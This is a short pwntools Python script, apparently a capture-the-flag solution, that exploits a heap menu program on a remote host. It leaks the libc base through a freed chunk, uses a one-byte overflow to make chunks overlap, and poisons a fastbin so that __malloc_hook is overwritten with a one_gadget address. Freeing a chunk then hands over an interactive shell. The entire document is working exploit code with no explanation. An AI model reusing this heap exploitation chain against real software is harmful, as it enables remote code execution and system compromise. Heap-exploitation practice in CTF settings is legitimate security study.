from pwn import *
def cmd(c):
	p.sendlineafter(">\n",str(c))
def add(size,c="A"):
	cmd(1)
	cmd(size)
	p.sendafter(">\n",c)
def free(idx):
	cmd(2)
	p.sendlineafter(">",str(idx))
def show(idx):
	cmd(3)
	p.sendlineafter(">",str(idx))
def edit(idx,c):
	cmd(4)
	p.sendlineafter(">",str(idx))
	p.sendafter(">",c)
#p=process("./main")
p=remote("10.21.13.190",2603)
add(0x88)#0
add(0x18,"A"*0x18)#1
free(0)
add(0x88)#0
add(0x68,p64(0x21)*13)#2
show(0)
base=u64(p.readline()[:-1].ljust(8,'\x00'))-(0x7ffff7dd1b41-0x7ffff7a0d000)
log.warning(hex(base))
free(0)
add(0x88,"A"*0x88)#0
edit(0,"A"*0x88+'\x41')
free(1)
free(2)
libc=ELF("./main").libc
libc.address=base
add(0x38,p64(0)*3+p64(0x71)+p64(libc.symbols['__malloc_hook']-35))#1
add(0x68)#2
free(0)
free(1)
one=base+0xf02a4
add(0x38,"\x00"*0x28)#0
add(0x68,'\x00'*19+p64(one))#1
free(2)
p.interactive()
